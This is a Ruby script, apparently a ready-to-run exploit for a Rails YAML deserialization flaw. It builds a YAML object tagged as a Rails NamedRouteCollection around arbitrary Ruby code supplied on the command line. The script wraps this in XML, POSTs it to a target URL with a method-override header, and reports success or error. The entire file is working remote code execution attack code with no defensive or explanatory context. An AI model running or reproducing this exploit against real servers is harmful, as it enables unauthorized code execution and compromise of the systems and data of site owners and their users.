require 'net/http'
require 'uri'
require 'cgi'

def escape_payload(payload)
  "foo\n#{payload}\n__END__"
end

def wrap_payload(payload)
  "(#{payload}; @executed = true) unless @executed"
end

def exploit(url, payload)
  escaped_payload = escape_payload(wrap_payload(payload))

  yaml = "--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection\n? #{escaped_payload}\n: !ruby/struct\n  defaults:\n    :action: create\n    :controller: foos\n  required_parts: []\n  requirements:\n    :action: create\n    :controller: foos\n  segment_keys:\n    - :format"

  xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<exploit type=\"yaml\">#{CGI.escapeHTML(yaml)}</exploit>"

  uri = URI.parse(url)
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = (uri.scheme == 'https')
  request = Net::HTTP::Post.new(uri.request_uri)
  request['Content-Type'] = 'text/xml'
  request['X-HTTP-Method-Override'] = 'get'
  request.body = xml

  response = http.request(request)

  return response
end

if $0 == __FILE__
  unless ARGV.length >= 2
    $stderr.puts "usage: #{$0} URL RUBY"
    exit -1
  end

  url = ARGV[0]
  payload = ARGV[1]

  puts "Sending payload '#{payload}' to #{url} ..."
  response = exploit(url, payload)

  case response.code
  when '200'
    puts "Success!"
  when '500'
    puts "Error!"
  else
    puts "Received response code #{response.code}"
  end
end
